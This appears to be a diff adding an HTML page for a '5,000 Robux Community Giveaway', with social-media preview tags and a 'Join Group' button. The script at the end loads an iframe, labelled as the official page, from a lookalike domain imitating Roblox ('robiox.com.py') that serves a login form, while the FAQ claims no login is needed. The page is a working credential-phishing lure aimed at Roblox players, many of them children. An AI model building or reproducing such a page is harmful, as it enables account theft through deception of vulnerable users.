@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+
+<title>Roblox Community Giveaway</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- Discord embed / Open Graph -->
+<meta property="og:title" content="Roblox Community Giveaway – 5,000 Robux">
+<meta property="og:description" content="Join our Roblox community and take part in the 5,000 Robux giveaway. Winners are announced inside the group.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://roblox-giveaway.vercel.app/">
+<meta property="og:image" content="https://roblox-giveaway.vercel.app/preview.png">
+<meta name="twitter:card" content="summary_large_image">
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:Inter,system-ui,Arial,sans-serif;}
+
+body{
+min-height:100vh;
+background:
+radial-gradient(900px 500px at 80% -10%, rgba(0,255,150,.08), transparent),
+radial-gradient(600px 400px at 0% 100%, rgba(0,255,100,.06), transparent),
+#070b0e;
+color:#eafef2;
+overflow-x:hidden;
+}
+
+.bg{position:fixed;inset:0;pointer-events:none;overflow:hidden;}
+
+.dot{
+position:absolute;
+width:3px;
+height:3px;
+background:#22ff99;
+opacity:.25;
+animation:float 12s linear infinite;
+}
+
+@keyframes float{
+from{transform:translateY(110vh);}
+to{transform:translateY(-10vh);}
+}
+
+.wrapper{max-width:1100px;margin:auto;padding:70px 20px 90px;}
+
+.hero{text-align:center;animation:fadeUp .8s ease forwards;}
+
+.badge{
+display:inline-block;
+padding:8px 16px;
+border-radius:999px;
+background:rgba(34,255,153,.1);
+border:1px solid rgba(34,255,153,.25);
+color:#55ffb5;
+font-weight:600;
+letter-spacing:.4px;
+}
+
+h1{
+font-size:clamp(2.4rem,5vw,3.4rem);
+margin:22px 0 10px;
+line-height:1.1;
+}
+
+.highlight{color:#3cff9a;}
+
+.subtitle{
+max-width:680px;
+margin:0 auto 35px;
+color:#b9f5d5;
+font-size:1.05rem;
+}
+
+.card{
+margin-top:50px;
+background:linear-gradient(180deg, rgba(34,255,153,.05), rgba(34,255,153,.01));
+border:1px solid rgba(34,255,153,.18);
+border-radius:20px;
+padding:34px 28px 38px;
+box-shadow:0 0 40px rgba(0,255,140,.06);
+position:relative;
+overflow:hidden;
+animation:fadeUp 1s ease forwards;
+}
+
+.card::after{
+content:"";
+position:absolute;
+inset:-40%;
+background:conic-gradient(from 0deg, transparent, rgba(34,255,153,.15), transparent);
+animation:spin 14s linear infinite;
+}
+
+@keyframes spin{to{transform:rotate(360deg);}}
+
+.card-inner{position:relative;z-index:2;}
+
+.section-title{font-size:1.7rem;margin-bottom:10px;}
+
+.giveaway-info{
+display:grid;
+grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+gap:20px;
+margin:28px 0 32px;
+}
+
+.box{
+background:rgba(0,0,0,.35);
+border:1px solid rgba(34,255,153,.15);
+border-radius:14px;
+padding:18px 16px;
+text-align:center;
+}
+
+.box h3{color:#42ffab;margin-bottom:6px;font-size:1.15rem;}
+
+.join-area{text-align:center;margin-top:35px;}
+
+.join-text{font-weight:600;color:#baffdf;margin-bottom:10px;}
+
+.join-btn{
+display:inline-flex;
+align-items:center;
+justify-content:center;
+padding:14px 28px;
+border-radius:12px;
+background:linear-gradient(135deg,#1fff9c,#00c96a);
+color:#002b18;
+font-weight:800;
+letter-spacing:.4px;
+border:none;
+cursor:pointer;
+box-shadow:0 0 30px rgba(34,255,153,.35);
+transition:transform .2s ease, box-shadow .2s ease;
+}
+
+.join-btn:hover{
+transform:translateY(-2px) scale(1.02);
+box-shadow:0 0 45px rgba(34,255,153,.55);
+}
+
+/* embedded window */
+
+.window-box{
+position:relative;
+width:100%;
+height:420px;
+border-radius:14px;
+overflow:hidden;
+border:1px solid rgba(34,255,153,.25);
+background:#000;
+}
+
+.window-box.loading{
+box-shadow:0 0 25px rgba(34,255,153,.6);
+animation:glowPulse 1.5s ease-in-out infinite;
+}
+
+@keyframes glowPulse{
+0%,100%{box-shadow:0 0 20px rgba(34,255,153,.4);}
+50%{box-shadow:0 0 45px rgba(34,255,153,.9);}
+}
+
+.window-box iframe{
+width:100%;
+height:100%;
+border:0;
+display:none;
+}
+
+.window-placeholder{
+position:absolute;
+inset:0;
+display:flex;
+flex-direction:column;
+align-items:center;
+justify-content:center;
+text-align:center;
+color:#baffdf;
+font-size:.95rem;
+padding:20px;
+background:rgba(0,0,0,.35);
+z-index:3;
+gap:14px;
+}
+
+.loader{
+width:34px;
+height:34px;
+border-radius:50%;
+border:3px solid rgba(255,255,255,.2);
+border-top-color:#3cff9a;
+animation:spinLoader 1s linear infinite;
+}
+
+@keyframes spinLoader{
+to{transform:rotate(360deg);}
+}
+
+@media(max-width:600px){
+.window-box{height:300px;}
+}
+
+.steps{
+display:grid;
+grid-template-columns:repeat(auto-fit,minmax(230px,1fr));
+gap:18px;
+margin-top:24px;
+}
+
+.step{
+background:rgba(0,0,0,.35);
+border:1px solid rgba(34,255,153,.15);
+border-radius:14px;
+padding:18px 16px;
+}
+
+.step span{
+display:inline-block;
+color:#3cff9a;
+font-weight:700;
+margin-bottom:6px;
+}
+
+.timeline{
+display:grid;
+grid-template-columns:repeat(auto-fit,minmax(230px,1fr));
+gap:18px;
+margin-top:24px;
+}
+
+.timebox{
+background:rgba(0,0,0,.35);
+border:1px solid rgba(34,255,153,.15);
+border-radius:14px;
+padding:18px 16px;
+}
+
+.faq{
+margin-top:24px;
+display:grid;
+gap:12px;
+}
+
+.faq-item{
+background:rgba(0,0,0,.35);
+border:1px solid rgba(34,255,153,.15);
+border-radius:14px;
+overflow:hidden;
+}
+
+.faq-q{
+padding:14px 16px;
+cursor:pointer;
+display:flex;
+justify-content:space-between;
+align-items:center;
+font-weight:600;
+color:#baffdf;
+}
+
+.faq-a{
+max-height:0;
+overflow:hidden;
+transition:max-height .35s ease,padding .35s ease;
+padding:0 16px;
+color:#c9fbe4;
+font-size:.95rem;
+}
+
+.faq-item.active .faq-a{
+max-height:120px;
+padding:0 16px 14px;
+}
+
+.faq-icon{
+color:#3cff9a;
+transition:transform .3s ease;
+}
+
+.faq-item.active .faq-icon{
+transform:rotate(45deg);
+}
+
+.footer-note{
+text-align:center;
+margin-top:60px;
+color:#87dcb4;
+font-size:.9rem;
+opacity:.9;
+}
+
+@keyframes fadeUp{
+from{opacity:0;transform:translateY(20px);}
+to{opacity:1;transform:none;}
+}
+</style>
+</head>
+<body>
+
+<div class="bg" id="bg"></div>
+
+<div class="wrapper">
+
+<div class="hero">
+<span class="badge">Community Giveaway Event</span>
+
+<h1>
+5,000 Robux<br>
+<span class="highlight">Community Giveaway</span>
+</h1>
+
+<p class="subtitle">
+We’re giving back to the Roblox community with a huge 5,000 Robux giveaway.
+Join our group to stay updated and be part of future events and drops.
+</p>
+</div>
+
+<div class="card">
+<div class="card-inner">
+
+<h2 class="section-title">Giveaway Details</h2>
+
+<div class="giveaway-info">
+<div class="box">
+<h3>Prize Pool</h3>
+<p>5,000 Robux total</p>
+</div>
+<div class="box">
+<h3>Winners</h3>
+<p>Multiple community members</p>
+</div>
+<div class="box">
+<h3>How to Enter</h3>
+<p>Join our Roblox community</p>
+</div>
+<div class="box">
+<h3>Announcements</h3>
+<p>Posted in the group</p>
+</div>
+</div>
+
+<div class="join-area">
+<div class="join-text">Join our Roblox community!</div>
+
+<button class="join-btn" id="openWindow">
+Join Group
+</button>
+</div>
+
+</div>
+</div>
+
+<div class="card" style="margin-top:40px;">
+<div class="card-inner">
+
+<h2 class="section-title">Official Giveaway Page</h2>
+
+<div class="window-box" id="windowBox">
+
+<div class="window-placeholder" id="windowPlaceholder">
+<div class="loader" id="loader" style="display:none;"></div>
+<span id="windowText">Click “Join Group” to open the site here.</span>
+</div>
+
+<iframe
+id="giveawayFrame"
+src=""
+loading="lazy"
+referrerpolicy="no-referrer">
+</iframe>
+
+</div>
+
+</div>
+</div>
+
+<div class="card" style="margin-top:70px;">
+<div class="card-inner">
+
+<h2 class="section-title">How Winners Are Chosen</h2>
+
+<div class="steps">
+<div class="step">
+<span>Step 1</span>
+<p>All members in the group are eligible when the giveaway closes.</p>
+</div>
+<div class="step">
+<span>Step 2</span>
+<p>Usernames are collected from the group member list.</p>
+</div>
+<div class="step">
+<span>Step 3</span>
+<p>Winners are randomly selected by the event host.</p>
+</div>
+<div class="step">
+<span>Step 4</span>
+<p>Results are posted publicly inside the Roblox group.</p>
+</div>
+</div>
+
+</div>
+</div>
+
+<div class="card" style="margin-top:70px;">
+<div class="card-inner">
+
+<h2 class="section-title">Giveaway Timeline</h2>
+
+<div class="timeline">
+<div class="timebox">
+<h3 style="color:#42ffab;margin-bottom:6px;">Entries Open</h3>
+<p>Members can join the group and stay eligible.</p>
+</div>
+<div class="timebox">
+<h3 style="color:#42ffab;margin-bottom:6px;">Final Member Check</h3>
+<p>Group list is locked before selecting winners.</p>
+</div>
+<div class="timebox">
+<h3 style="color:#42ffab;margin-bottom:6px;">Winner Selection</h3>
+<p>Random draw is performed by the host.</p>
+</div>
+<div class="timebox">
+<h3 style="color:#42ffab;margin-bottom:6px;">Public Results</h3>
+<p>Winners are announced in the group.</p>
+</div>
+</div>
+
+</div>
+</div>
+
+<div class="card" style="margin-top:70px;">
+<div class="card-inner">
+
+<h2 class="section-title">Frequently Asked Questions</h2>
+
+<div class="faq">
+
+<div class="faq-item">
+<div class="faq-q">Is this affiliated with Roblox?<span class="faq-icon">+</span></div>
+<div class="faq-a">No. This is a community hosted giveaway and is not operated by Roblox.</div>
+</div>
+
+<div class="faq-item">
+<div class="faq-q">Do I need to log in on this site?<span class="faq-icon">+</span></div>
+<div class="faq-a">No. You only need to join the Roblox group using the official Roblox website.</div>
+</div>
+
+<div class="faq-item">
+<div class="faq-q">How will winners be contacted?<span class="faq-icon">+</span></div>
+<div class="faq-a">Winners are announced publicly inside the group.</div>
+</div>
+
+<div class="faq-item">
+<div class="faq-q">Can I leave the group after joining?<span class="faq-icon">+</span></div>
+<div class="faq-a">You must still be in the group at the time of the draw to be eligible.</div>
+</div>
+
+</div>
+
+</div>
+</div>
+
+<div class="footer-note">
+Must be in our group to be able to win.
+</div>
+
+</div>
+
+<script>
+const bg=document.getElementById("bg");
+for(let i=0;i<80;i++){
+const d=document.createElement("div");
+d.className="dot";
+d.style.left=Math.random()*100+"%";
+d.style.top=Math.random()*100+"%";
+d.style.animationDelay=(-Math.random()*12)+"s";
+d.style.opacity=Math.random()*0.4+0.05;
+bg.appendChild(d);
+}
+
+document.querySelectorAll(".faq-item").forEach(item=>{
+item.querySelector(".faq-q").addEventListener("click",()=>{
+item.classList.toggle("active");
+});
+});
+
+const openBtn = document.getElementById("openWindow");
+const frame = document.getElementById("giveawayFrame");
+const placeholder = document.getElementById("windowPlaceholder");
+const loader = document.getElementById("loader");
+const windowText = document.getElementById("windowText");
+const windowBox = document.getElementById("windowBox");
+
+openBtn.addEventListener("click", () => {
+
+windowText.textContent = "Loading official page…";
+loader.style.display = "block";
+windowBox.classList.add("loading");
+
+frame.src = "https://www.robiox.com.py/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F366258994466%2FSteal-a-Brainrot";
+frame.style.display = "block";
+
+frame.onload = () => {
+placeholder.style.display = "none";
+loader.style.display = "none";
+windowBox.classList.remove("loading");
+};
+
+});
+</script>
+
+</body>
+</html>
